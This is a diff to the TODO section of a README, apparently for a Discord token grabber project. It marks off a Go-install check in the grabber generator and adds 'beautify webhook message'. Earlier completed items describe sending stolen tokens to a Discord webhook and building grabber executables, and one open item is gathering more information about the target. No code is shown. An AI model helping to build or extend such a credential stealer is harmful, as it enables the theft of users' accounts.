@@ -15,5 +15,6 @@ It is recommended to use the [generator](https://github.com/pedrokpp/discord-tok
 ## TODO
 - [x] Send it to a Discord Webhook
 - [x] Executable that generates automatically token grabber with webhook URL and OUTPUTNAME provided
-- [ ] Check if user has go installed when using the generator
+- [x] Check if user has go installed when using the generator
+- [ ] Beautify webhook message
 - [ ] Get more information about the target
